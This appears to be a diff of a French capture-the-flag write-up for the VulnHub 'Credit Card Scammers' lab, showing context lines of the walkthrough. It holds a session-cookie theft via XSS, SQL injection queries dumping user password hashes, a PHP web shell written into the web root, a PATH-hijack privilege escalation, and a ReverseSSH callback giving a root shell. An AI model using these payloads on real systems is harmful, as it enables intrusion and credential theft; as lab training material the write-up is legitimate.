@@ -10,7 +10,7 @@ Scammers gonna scam
 
 Sur fond d'arnaque lié au COVID-19 on doit pénétrer le serveur des scammers et obtenir 3 flags.  
 
-```plain
+```
 $ sudo nmap -p- -sC -sV -T5 192.168.56.116
 Starting Nmap 7.92 ( https://nmap.org )
 Nmap scan report for 192.168.56.116
@@ -39,7 +39,7 @@ Un formulaire de paiement est présent sur le site mais ni un test manuel ni une
 
 J’enchaîne donc sur une énumération web à l'aide de la wordlist *directory-list-2.3-big.txt* fournie avec ce vénérable DirBuster.  
 
-```plain
+```
 301        7l       20w      234c http://192.168.56.116/img
 200      159l      461w     5822c http://192.168.56.116/index.html
 301        7l       20w      234c http://192.168.56.116/css
@@ -75,7 +75,7 @@ Aucun retour ! Ah !
 
 Un nouveau scan de port fait cette fois apparaître un nouveau venu sur le port 443.  
 
-```plain
+```
 22/tcp   open   ssh        OpenSSH 8.0 (protocol 2.0)
 | ssh-hostkey: 
 |   3072 8d:0a:3a:42:5f:92:47:69:33:59:b3:77:53:3c:be:73 (RSA)
@@ -92,7 +92,7 @@ Un nouveau scan de port fait cette fois apparaître un nouveau venu sur le port 
 
 Nmap y voit du [Mongoose](https://en.wikipedia.org/wiki/Mongoose_(web_server)) mais aucun entête ne permet de vérifier cette information. On obtient juste une réponse étrange :  
 
-```plain
+```
 $ curl -D- http://192.168.56.116:443/
 HTTP/1.1 404 Not Found
 Cache: no-cache
@@ -172,7 +172,7 @@ On ne s'en sort jamais de ces énumérations
 
 Nouvelle énumération web, cette fois avec la wordlist *raft-large-directories.txt* :  
 
-```plain
+```
 200       60l      174w     3658c http://192.168.56.116/_admin/dist/login.html
 302        0l        0w        0c http://192.168.56.116/_admin/dist/index.php
 302        0l        0w        0c http://192.168.56.116/_admin/dist/logout.php
@@ -194,7 +194,7 @@ J'ai donc procédé une nouvelle fois à l'injection XSS mais cette fois en spé
 
 Finalement j'ai obtenu la réponse que j'attendais :  
 
-```plain
+```
 192.168.56.1 - - [22/Dec/2021 13:28:11] "GET /?PHPSESSID=ng7d02qbbl7jucjgc2motad5qp HTTP/1.1" 200 -
 ```
 
@@ -207,7 +207,7 @@ Via le tableau HTML du dashboard et les noms de colonnes on devine qu'il y a une
 
 ![Credit Card Scammers VulnHub CTF admin interface](/assets/img/vulnhub/scammers.png)
 
-```plain
+```
 update orders set cvv=current_user();
 ```
 
@@ -215,7 +215,7 @@ Et de retour au dashboard je vois que la valeur est devenue *orders@%*.
 
 Extraction des bases de données, tables, colonnes et finalement users/passwords :  
 
-```plain
+```
 update orders set cvv=(select group_concat(schema_name) from information_schema.schemata);
 select group_concat(table_name) from information_schema.tables where table_schema='orders';
 select group_concat(column_name) from information_schema.columns where table_schema='orders' and table_name='users';
@@ -224,7 +224,7 @@ select group_concat(concat_ws(0x7c, userName, password)) from users;
 
 Ce qui nous donne finalement ce bel output :  
 
-```plain
+```
 admin|$2y$12$A4jqwtWB73.TAMIeplx0T.5oG/mnHR1qTDa8cmtTIvW3ZTjdSjdjC,m0n3y6r4bb3r|$2y$12$EX/FDsztTMwftzPRyY8gFuM7ZjAphQRZs88qpZpmboRogOAOYXowC
 ```
 
@@ -232,7 +232,7 @@ Le hash de l'utilisateur *m0n3y6r4bb3r* finit par tomber à l'aide de JtR (c'est
 
 SQLmap parvient à extraire des infos lui aussi mais via time-based. J'en ait profité pour dumper les privilèges de l'utilisateur courant (via *--privileges*).  
 
-```plain
+```
 database management system users privileges:
 [*] %orders% [1]:
     privilege: FILE
@@ -242,7 +242,7 @@ On ne l'aurait pas forcément deviné puisqu'on ne tourne pas avec l'utilisateur
 
 Plus qu'à dumper un shell PHP sur le serveur. A la racine web ça fonctionne :  
 
-```plain
+```
 select "<?php system($_GET['cmd']); ?>" into outfile '/var/www/html/yolo.php';
 ```
 
@@ -263,7 +263,7 @@ Soit les chaînes respectives*WPamTh2Y9uMdphb6z0cp* et *9N8U10EAVU10cbSZPCRv*.
 
 *LinPEAS* montre rapidement du doigt un binaire setuid inhabituel ainsi qu'un script qui semble lié :  
 
-```plain
+```
 -rwsr-xr-x. 1 root root 17K May  9  2020 /usr/bin/backup (Unknown SUID binary)
 /home/moneygrabber/backup.sh
 ```
@@ -278,7 +278,7 @@ sleep 30
 
 Pour ce qui est du binaire :  
 
-```plain
+```
 [moneygrabber@ppeshop ~]$ strings /usr/bin/backup
 /lib64/ld-linux-x86-64.so.2
 libc.so.6
@@ -299,7 +299,7 @@ Cet exécutable appelle le script avec le path complet mais ensuite le script ut
 
 Je lance d'abord [ReverseSSH](https://github.com/Fahrj/reverse-ssh) en local :  
 
-```plain
+```
 $ sudo ./reverse-sshx64 -l -v -p 443
 2021/12/22 21:54:15 Starting ssh server on :443
 2021/12/22 21:54:15 Success: listening on [::]:443
@@ -307,7 +307,7 @@ $ sudo ./reverse-sshx64 -l -v -p 443
 
 Sur la VM :  
 
-```plain
+```
 [moneygrabber@ppeshop ~]$ cat tar
 #!/usr/bin/bash
 ./reverse-sshx64 -v -p 443 192.168.56.1
@@ -318,7 +318,7 @@ Sur la VM :
 
 E.T. téléphone maison :  
 
-```plain
+```
 2021/12/22 21:54:42 Successful authentication with password from reverse@192.168.56.116:34922
 2021/12/22 21:54:42 Attempt to bind at 127.0.0.1:8888 granted
 2021/12/22 21:54:42 New connection from 192.168.56.116:34922: root on ppeshop reachable via 127.0.0.1:8888
@@ -326,7 +326,7 @@ E.T. téléphone maison :
 
 Et enfin (le mot de passe demandé est celui par défaut de ReverseSSH) :  
 
-```plain
+```
 $ ssh -p 8888 127.0.0.1
 The authenticity of host '[127.0.0.1]:8888 ([127.0.0.1]:8888)' can't be established.
 RSA key fingerprint is SHA256:3qx1PQUheJi+syVb+vtVrdyjSlIAd7hTZnPyV4kyZYg.
